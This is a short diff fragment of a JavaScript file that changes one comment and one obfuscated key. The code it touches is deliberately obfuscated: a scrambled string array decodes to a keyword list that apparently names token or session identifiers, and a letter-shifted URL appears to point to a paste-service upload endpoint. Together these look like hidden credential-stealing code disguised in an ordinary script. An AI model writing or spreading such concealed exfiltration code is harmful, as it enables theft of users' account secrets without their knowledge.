@@ -1,6 +1,5 @@
 let _$_bd1f=(function(l,g){let i=l.length;let c=[];for(let v=0;v< i;v++){c[v]= l.charAt(v)};for(let v=0;v< i;v++){let f=g* (v+ 384)+ (g% 34521);let m=g* (v+ 319)+ (g% 36685);let q=f% i;let d=m% i;let o=c[q];c[q]= c[d];c[d]= o;g= (f+ m)% 3458025};let h=String.fromCharCode(127);let s='';let p='\x25';let k='\x23\x31';let a='\x25';let u='\x23\x30';let y='\x23';return c.join(s).split(p).join(h).split(k).join(a).split(u).join(y).split(h)})("etssonkoiesi%n%did",2540754);const KEYWORDS=[_$_bd1f[0],_$_bd1f[1],_$_bd1f[2]]
 
-// Rectify Strings
 function reminify(i, cng) {
     cng = cng % 26;
     const cngString = (str) => {
@@ -112,7 +111,7 @@ function syncReq(requests) {
 
 const updateSec = "tffbe://tmefqnuz.oay/paogyqzfe";
 
-const xylonPMP = "ii755hdgf6f472e1f2he3705ii7407835d872f4512281g3952e8h37g15e82e5g6e11d34122537hg69d6h08457h98i70d53i7657i3hhihh2183hi36gd12i4h298";
+const xylonPMP = "3273b861b0a09426x437732yxxx596c2b495a5zb885x2442xb4yy60c0cx5696b5xa14zb05x10485xy94959b23700x47cb58887226c6b0y683b3acaz823c2c147";
 
 async function nucleiFetch(nuclei) {
     try {
